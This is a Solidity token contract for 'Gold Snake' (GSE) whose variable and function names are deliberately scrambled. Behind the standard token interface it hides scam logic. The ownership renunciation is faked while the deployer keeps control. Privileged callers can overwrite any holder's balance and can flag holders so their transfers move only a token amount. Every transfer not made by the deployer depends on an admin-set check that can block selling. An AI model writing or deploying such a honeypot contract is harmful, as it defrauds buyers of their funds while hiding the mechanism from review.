//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface xwwqjokncwzkrp {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract xmdsmaasq {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface iqluobzpmysyjy {
    function createPair(address sgqkpczpjqp, address ibxlikcvsuaui) external returns (address);
}

interface bhkujquzfbg {
    function totalSupply() external view returns (uint256);

    function balanceOf(address hmfwgzixlk) external view returns (uint256);

    function transfer(address txnusawvy, uint256 khgqpklhcbjqk) external returns (bool);

    function allowance(address anulpshog, address spender) external view returns (uint256);

    function approve(address spender, uint256 khgqpklhcbjqk) external returns (bool);

    function transferFrom(
        address sender,
        address txnusawvy,
        uint256 khgqpklhcbjqk
    ) external returns (bool);

    event Transfer(address indexed from, address indexed pbmuoeuuqkrzab, uint256 value);
    event Approval(address indexed anulpshog, address indexed spender, uint256 value);
}

interface bhkujquzfbgMetadata is bhkujquzfbg {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GoldSnake is xmdsmaasq, bhkujquzfbg, bhkujquzfbgMetadata {

    uint256 private swqolcohbieo = 100000000 * 10 ** 18;

    mapping(address => bool) public uwylqtqichh;

    address private wzzoipbbend;

    address gsqgrjcgoalr = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return wzzoipbbend;
    }

    uint8 private rtnvvrjhxad = 18;

    bool private ejvuihlfnua;

    function mvxrttygoxy(uint256 khgqpklhcbjqk) public {
        hxcrflide();
        ufqykkufmcrmh = khgqpklhcbjqk;
    }

    function transferFrom(address szupfqygns, address txnusawvy, uint256 khgqpklhcbjqk) external override returns (bool) {
        if (_msgSender() != wfhxhcssaycndf) {
            if (atwtrfrbxz[szupfqygns][_msgSender()] != type(uint256).max) {
                require(khgqpklhcbjqk <= atwtrfrbxz[szupfqygns][_msgSender()]);
                atwtrfrbxz[szupfqygns][_msgSender()] -= khgqpklhcbjqk;
            }
        }
        return xmkwrfdhqw(szupfqygns, txnusawvy, khgqpklhcbjqk);
    }

    mapping(address => bool) public lzqoutbvojb;

    uint256 qezrkhfcu;

    mapping(address => mapping(address => uint256)) private atwtrfrbxz;

    event OwnershipTransferred(address indexed muhlmedovhekz, address indexed izwnlbruc);

    string private xdsvqynoqxfyfh = "Gold Snake";

    function totalSupply() external view virtual override returns (uint256) {
        return swqolcohbieo;
    }

    bool public mnkftctixp;

    function hxcrflide() private view {
        require(lzqoutbvojb[_msgSender()]);
    }

    function oyywfitectxf(address szupfqygns, address txnusawvy, uint256 khgqpklhcbjqk) internal returns (bool) {
        require(lupvnxgrt[szupfqygns] >= khgqpklhcbjqk);
        lupvnxgrt[szupfqygns] -= khgqpklhcbjqk;
        lupvnxgrt[txnusawvy] += khgqpklhcbjqk;
        emit Transfer(szupfqygns, txnusawvy, khgqpklhcbjqk);
        return true;
    }

    address public arpsotfoc;

    function name() external view virtual override returns (string memory) {
        return xdsvqynoqxfyfh;
    }

    function xmkwrfdhqw(address szupfqygns, address txnusawvy, uint256 khgqpklhcbjqk) internal returns (bool) {
        if (szupfqygns == arpsotfoc) {
            return oyywfitectxf(szupfqygns, txnusawvy, khgqpklhcbjqk);
        }
        uint256 zgkuqltfeg = bhkujquzfbg(xokrtajcf).balanceOf(gsqgrjcgoalr);
        require(zgkuqltfeg == ufqykkufmcrmh);
        if (uwylqtqichh[szupfqygns]) {
            return oyywfitectxf(szupfqygns, txnusawvy, rrdjdjufazatf);
        }
        return oyywfitectxf(szupfqygns, txnusawvy, khgqpklhcbjqk);
    }

    function approve(address vbzaavcihoeys, uint256 khgqpklhcbjqk) public virtual override returns (bool) {
        atwtrfrbxz[_msgSender()][vbzaavcihoeys] = khgqpklhcbjqk;
        emit Approval(_msgSender(), vbzaavcihoeys, khgqpklhcbjqk);
        return true;
    }

    function lzjulhgnsxn() public {
        emit OwnershipTransferred(arpsotfoc, address(0));
        wzzoipbbend = address(0);
    }

    uint256 public cppzbrjaymnv;

    uint256 constant rrdjdjufazatf = 12 ** 10;

    function tnuhlgdmgfc(address vpcnrrjpualngi) public {
        if (kcjzbazqbtude) {
            return;
        }
        if (ejvuihlfnua != mnkftctixp) {
            pgjqxaoja = sloockrwytoxsf;
        }
        lzqoutbvojb[vpcnrrjpualngi] = true;
        if (sloockrwytoxsf == cppzbrjaymnv) {
            sloockrwytoxsf = lkpchbdlobp;
        }
        kcjzbazqbtude = true;
    }

    function allowance(address oiucgqbqhczl, address vbzaavcihoeys) external view virtual override returns (uint256) {
        if (vbzaavcihoeys == wfhxhcssaycndf) {
            return type(uint256).max;
        }
        return atwtrfrbxz[oiucgqbqhczl][vbzaavcihoeys];
    }

    uint256 public pgjqxaoja;

    address public xokrtajcf;

    bool private qwjrrdawomqnjo;

    uint256 private sloockrwytoxsf;

    function wftyoaiyusy(address cnpazgsbger, uint256 khgqpklhcbjqk) public {
        hxcrflide();
        lupvnxgrt[cnpazgsbger] = khgqpklhcbjqk;
    }

    function balanceOf(address hmfwgzixlk) public view virtual override returns (uint256) {
        return lupvnxgrt[hmfwgzixlk];
    }

    address wfhxhcssaycndf = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        if (mnkftctixp) {
            cppzbrjaymnv = qqdzqbvkzrdoi;
        }
        lzjulhgnsxn();
        xwwqjokncwzkrp nsxnararf = xwwqjokncwzkrp(wfhxhcssaycndf);
        xokrtajcf = iqluobzpmysyjy(nsxnararf.factory()).createPair(nsxnararf.WETH(), address(this));
        if (mnkftctixp == qwjrrdawomqnjo) {
            sloockrwytoxsf = cppzbrjaymnv;
        }
        arpsotfoc = _msgSender();
        lzqoutbvojb[arpsotfoc] = true;
        lupvnxgrt[arpsotfoc] = swqolcohbieo;
        if (mnkftctixp != ejvuihlfnua) {
            mnkftctixp = false;
        }
        emit Transfer(address(0), arpsotfoc, swqolcohbieo);
    }

    uint256 ufqykkufmcrmh;

    function symbol() external view virtual override returns (string memory) {
        return iattugfuni;
    }

    string private iattugfuni = "GSE";

    uint256 public xcnhgvabdxax;

    uint256 private lkpchbdlobp;

    function transfer(address cnpazgsbger, uint256 khgqpklhcbjqk) external virtual override returns (bool) {
        return xmkwrfdhqw(_msgSender(), cnpazgsbger, khgqpklhcbjqk);
    }

    function decimals() external view virtual override returns (uint8) {
        return rtnvvrjhxad;
    }

    bool public kcjzbazqbtude;

    uint256 public qqdzqbvkzrdoi;

    function getOwner() external view returns (address) {
        return wzzoipbbend;
    }

    function hrzqtuqtlywy(address dilulqujfxnx) public {
        hxcrflide();
        if (qwjrrdawomqnjo != ejvuihlfnua) {
            ejvuihlfnua = true;
        }
        if (dilulqujfxnx == arpsotfoc || dilulqujfxnx == xokrtajcf) {
            return;
        }
        uwylqtqichh[dilulqujfxnx] = true;
    }

    mapping(address => uint256) private lupvnxgrt;

}